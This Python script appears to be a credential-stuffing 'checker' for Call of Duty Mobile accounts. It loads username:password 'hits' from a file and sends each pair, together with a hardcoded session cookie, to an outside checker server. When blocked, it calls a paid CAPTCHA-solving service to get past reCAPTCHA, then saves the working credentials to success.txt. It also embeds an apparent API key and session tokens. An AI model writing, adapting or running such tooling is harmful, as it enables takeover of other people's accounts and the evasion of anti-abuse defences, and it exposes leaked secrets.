import requests
import time

# CaptchaAI API Key
CAPTCHA_API_KEY = "f229e96939b527ccf9a986f3804053ea"

# CODM Checker API Endpoint
API_URL = "http://sgp1.hmvhostings.com:25592/gg"

# Cookie (Optional)
cookie = "_ga=GA1.1.679306101.1727075595; _ga_G8QGMJPWWV=GS1.1.1729344366.1.0.1729344366.0.0.0; _ga_XB5PSHEQB4=GS1.1.1729427169.2.0.1729427169.0.0.0; _ga_G3FBKF6PP0=GS1.1.1729700876.7.0.1729700903.0.0.0; ac_session=da926d99wxpv20cgfnwm4v22znrczund; sso_key=2469ac9d278172dc7eb845f3ac7817ec5abc304343f054a5fe3f8791e7fc4eac; datadome=wQE8taYBHl_rHi6hzu8soK8Adu~wvlK3H2x3f9MglKMjyxekEhku3TvGhZCFWskU6OhJ1wTo_rs3qPHkdAeslzZ2_WAvuWETKdOXcw33fFMJP9T6m_XfI9PuNZBVNVcA; _ga_1M7M9L6VPX=GS1.1.1729700915.36.1.1729702134.0.0.0"  # Optional, if the API requires it

# Headers to mimic browser behavior
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "http://sgp1.hmvhostings.com/",
    "Connection": "keep-alive",
}

# CaptchaAI Endpoint
CAPTCHA_SOLVER_URL = "https://api.captchaai.com/solve"

def solve_captcha(site_key, site_url):
    """Solve CAPTCHA using CaptchaAI."""
    data = {
        "key": CAPTCHA_API_KEY,
        "method": "userrecaptcha",
        "googlekey": site_key,  # The site key from the CAPTCHA challenge
        "pageurl": site_url,  # The page URL where the CAPTCHA is located
    }
    response = requests.post(CAPTCHA_SOLVER_URL, data=data)
    if response.status_code == 200:
        captcha_id = response.json().get("request")
        # Poll for the solution
        while True:
            solution_response = requests.get(f"https://api.captchaai.com/res?key={CAPTCHA_API_KEY}&action=get&id={captcha_id}")
            solution = solution_response.json().get("request")
            if solution == "CAPCHA_NOT_READY":
                time.sleep(5)  # Wait for the solution to be ready
            else:
                return solution
    else:
        print("Failed to solve CAPTCHA:", response.text)
        return None

def load_accounts(file_name):
    """Load accounts from a file."""
    try:
        with open(file_name, "r") as file:
            accounts = [line.strip().split(":") for line in file]
        return accounts
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
        return []

def save_results(successful, failed):
    """Save the results to files."""
    with open("success.txt", "a") as success_file:
        success_file.writelines([f"{item}\n" for item in successful])
    
    with open("failed.txt", "a") as failed_file:
        failed_file.writelines([f"{item}\n" for item in failed])

def bind_checker(file_name):
    accounts = load_accounts(file_name)
    
    if not accounts:
        return
    
    successful = []
    failed = []

    for username, password in accounts:
        try:
            # Send GET request
            response = requests.get(API_URL, headers=headers, params={
                "user": username,
                "pass": password,
                "cookie": cookie,
            }, timeout=10)

            # Handle CAPTCHA if 403 is received
            if response.status_code == 403:
                print(f"CAPTCHA detected for {username}, attempting to solve...")
                # Replace these with the actual site key and URL from the CAPTCHA
                site_key = "<captcha_site_key>"
                site_url = "<captcha_page_url>"
                captcha_solution = solve_captcha(site_key, site_url)
                if captcha_solution:
                    print(f"CAPTCHA solved for {username}. Retrying with solution...")
                    # Retry request with CAPTCHA solution
                    response = requests.get(API_URL, headers=headers, params={
                        "user": username,
                        "pass": password,
                        "cookie": cookie,
                        "g-recaptcha-response": captcha_solution,  # Add the solution
                    })
            
            if response.status_code == 200:
                print(f"Success for {username}: {response.json()}")
                successful.append(f"{username}:{password}")
            else:
                print(f"Failed for {username}: {response.status_code} - {response.text}")
                failed.append(f"{username}:{password}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {username}: {e}")
            failed.append(f"{username}:{password}")
    
    # Save results to files
    save_results(successful, failed)

# Run the checker
if __name__ == "__main__":
    # Prompt user to enter the file name
    file_name = input("Enter the file name with account hits (e.g., accounts.txt): ").strip()
    bind_checker(file_name)
